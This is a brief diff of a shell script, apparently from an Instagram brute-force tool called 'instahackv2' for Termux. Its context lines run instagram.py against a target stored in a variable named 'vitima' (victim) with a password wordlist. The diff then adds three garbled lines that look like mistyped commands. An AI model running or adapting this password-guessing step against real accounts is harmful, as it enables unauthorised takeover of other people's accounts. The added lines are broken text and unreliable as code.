@@ -42,3 +42,6 @@ pip2 install -r requirements.txt
 python3 instagram.py $vitima /data/data/com.termux/files/home/instahackv2/Brute-Force/wordlist/wordlist.txt -m 3
 fi
 exit
+Shinstahackv2.sh
+Cdinstahackv2
+
